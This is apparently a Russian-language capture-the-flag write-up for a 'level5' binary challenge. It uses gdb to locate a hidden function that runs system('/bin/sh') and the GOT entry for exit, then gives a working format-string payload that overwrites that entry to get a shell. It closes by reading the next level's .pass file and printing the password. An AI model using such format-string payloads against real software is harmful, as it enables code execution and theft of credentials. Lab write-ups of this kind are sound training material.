
# Вызов функции 'fgets', защищенной от переполнения буфера
=> 0x80484e5 <n+35>:	call   0x80483a0 <fgets@plt>

# Можно увидеть вызов 'printf' с тем что мы ввели
=> 0x80484f3 <n+49>:	call   0x8048380 <printf@plt>

# Мы также можем увидеть функцию 'o', которая вызывает 'system ("/ bin / sh")'
# Но эта функция не вызывается

# Сначала нам нужно найти адрес этой функции 'o'
gdb> x o
0x80484a4 <o>:	0x83e58955

# Функция 'main' вызывает функцию 'n', которая возвращает вместо этого вызывает 'exit'
=> 0x80484ff <n+61>:	call   0x80483d0 <exit@plt>

# Затем мы найдем адрес функции выхода в Global Offset Table

gdb> disass n
[...]
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
[...]
gdb> disass 0x80483d0
[...]
0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
[...]
gdb> x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6

# 'o' находится по адресу 0x80484a4, а 'exit' находится по адресу '0x8049838' в Global Offset Table

# Сначала мы воспользуемся атакой Format String, чтобы найти адрес 'exit'
$> python -c "print '\x38\x98\x04\x08' + '%x '*4" | ./level5
8200 b7fd1ac0 b7ff37d0 8049838

# Затем мы используем тот же эксплойт, чтобы изменить адрес 'exit' на адрес 'o'
$> python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload5
$> cat /tmp/payload5 - | ./level5
> cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31